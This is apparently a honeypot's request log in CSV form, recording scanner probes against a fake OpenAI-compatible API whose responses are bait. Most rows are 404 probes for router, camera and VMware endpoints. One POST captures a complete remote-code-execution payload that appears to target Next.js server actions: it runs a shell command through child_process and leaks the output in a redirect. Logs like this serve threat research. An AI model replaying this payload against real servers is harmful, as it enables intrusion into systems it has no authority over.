request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
8572fceb-ba35-4186-a64b-e2a1adfda5a3,2026-05-10T23:02:16.393991+00:00,anon_61ed4dec,GET,/bic/ssoService/v1/applyCT,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
e76c8b8f-c53c-45fb-91c3-dc663937a0ef,2026-05-10T23:02:18.422575+00:00,anon_61ed4dec,GET,/dnscfg.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
210242dd-194a-430a-a8d0-6542ba863f29,2026-05-10T23:02:20.436355+00:00,anon_61ed4dec,GET,/GponForm/diag_Form,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a6362e7d-0ecd-4094-8277-8ad9bcfae105,2026-05-10T23:02:22.472009+00:00,anon_61ed4dec,GET,/cgi-bin/time_tzsetup.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
cd3d416a-b8a8-4255-abe4-4510ff82cc3e,2026-05-10T23:02:24.493698+00:00,anon_61ed4dec,GET,/currentsetting.htm,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5aa3de6b-bcec-415a-a61e-1f233b5ebcc4,2026-05-10T23:02:25.994402+00:00,anon_61ed4dec,GET,/cgi-bin/user/Config.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
13deafa9-c2e3-47c7-a439-4cfe2d56c121,2026-05-10T23:02:27.930682+00:00,anon_61ed4dec,GET,/onvif/device_service,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f60d9ea0-9066-42ea-b2db-c3cc5fed46e8,2026-05-10T23:15:57.952900+00:00,anon_61ed4dec,GET,/bic/ssoService/v1/applyCT,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
acc8af2f-1bf7-4c6e-a26d-d3000dde657d,2026-05-10T23:15:59.965016+00:00,anon_61ed4dec,GET,/dnscfg.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3320d013-b2ca-49b7-9501-626a46a3bde4,2026-05-10T23:16:02.142307+00:00,anon_61ed4dec,GET,/GponForm/diag_Form,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b6286cf3-2d42-4e90-a212-2f0ac19a2cbd,2026-05-10T23:16:04.250906+00:00,anon_61ed4dec,GET,/cgi-bin/time_tzsetup.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
cecbda34-0d20-4d5a-9fae-7ab3af9f2fa5,2026-05-10T23:16:06.275861+00:00,anon_61ed4dec,GET,/currentsetting.htm,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9bb480a9-104d-4879-bd38-5d4e46c49349,2026-05-10T23:16:08.316092+00:00,anon_61ed4dec,GET,/cgi-bin/user/Config.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b9d296c8-11ee-49c8-89ac-8b9021e9af15,2026-05-10T23:16:10.252972+00:00,anon_61ed4dec,GET,/onvif/device_service,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4a02604f-59b1-44aa-99c0-77ada163da01,2026-05-10T23:16:22.021286+00:00,anon_0e13e0dc,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
bd75bdbf-122b-4d13-9669-567f0ada5d12,2026-05-10T23:35:21.236599+00:00,anon_c7d497bc,POST,/,[honeypot-host],Mozilla/5.0,anon_12ca17b4,669,316,1,,"------R0hdegz3HUkSNLer
Content-Disposition: form-data; name=""0""

{""_response"":{""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""},""_prefix"":""var res=process.mainModule.require('chil'+'d_process').execSync('id',{timeout:10000,encoding:'utf8'}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/x?out='+encodeURIComponent(res)+';307;'});""},""reason"":-1,""status"":""resolved_model"",""then"":""$1:__proto__:then"",""value"":""{\""then\"":\""$B1337\""}""}
------R0hdegz3HUkSNLer
Content-Disposition: form-data; name=""1""

""$@0""
------R0hdegz3HUkSNLer
Content-Disposition: form-data; name=""2""

[]
------R0hdegz3HUkSNLer--","------R0hdegz3HUkSNLer
Content-Disposition: form-data; name=""0""

{""_response"":{""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""},""_prefix"":""var res=process.mainModule.require('chil'+'d_process').execSync('id',{timeout:10000,encoding:'utf8'}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/x?out='+encodeURIComponent(res)+';307;'});""},""reason"":-1,""status"":""resolved_model"",""then"":""$1:__proto__:then"",""value"":""{\""then\"":\""$B1337\""}""}
------R0hdegz3HUkSNLer
Content-Disposition: form-data; name=""1""

""$@0""
------R0hdegz3HUkSNLer
Content-Disposition: form-data; name=""2""

[]
------R0hdegz3HUkSNLer--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
970be9e8-e179-44b6-9592-7d39e0c869b8,2026-05-10T23:35:50.433389+00:00,anon_5efd7992,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
3a8ba701-fd2b-4e95-a23c-d5098163aebf,2026-05-10T23:36:28.666329+00:00,anon_61ed4dec,GET,/bic/ssoService/v1/applyCT,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8e17f950-8bf4-41fb-9713-a90900698462,2026-05-10T23:36:30.599222+00:00,anon_61ed4dec,GET,/dnscfg.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c76c0c9a-22fa-40dc-b12e-22e1a0c6465b,2026-05-10T23:36:32.670406+00:00,anon_61ed4dec,GET,/GponForm/diag_Form,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6bd3e598-26da-4a26-a4fb-1e726c941d60,2026-05-10T23:36:34.761486+00:00,anon_61ed4dec,GET,/cgi-bin/time_tzsetup.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0285be0c-f5d3-40f7-9834-d93406d9b2f8,2026-05-10T23:36:36.126448+00:00,anon_61ed4dec,GET,/currentsetting.htm,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e1c11fc6-4981-485f-ae8c-35f08814893d,2026-05-10T23:36:38.226268+00:00,anon_61ed4dec,GET,/cgi-bin/user/Config.cgi,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
208adb0b-12cb-4663-8cf6-faa904b20eda,2026-05-10T23:36:40.224699+00:00,anon_61ed4dec,GET,/onvif/device_service,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c664635a-c792-4751-9f3f-cd1b0462012b,2026-05-10T23:50:44.812977+00:00,anon_551a0f73,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
1f5819c1-711b-4a30-8099-dd56f93b3ee5,2026-05-10T23:56:25.654636+00:00,anon_b06b65de,GET,/,,,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
c6e1c8af-6a66-4cbe-8754-cfbfb78f383f,2026-05-10T23:56:27.186147+00:00,anon_b06b65de,POST,/sdk,[honeypot-host],Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/),,441,316,1,,"<soap:Envelope xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns=""urn:internalvim25""><_this xsi:type=""ManagedObjectReference"" type=""ServiceInstance"">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>","<soap:Envelope xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns=""urn:internalvim25""><_this xsi:type=""ManagedObjectReference"" type=""ServiceInstance"">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8297f034-41ef-41fe-9fa0-a53d40c7aeea,2026-05-10T23:56:27.189518+00:00,anon_b06b65de,GET,/,,,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
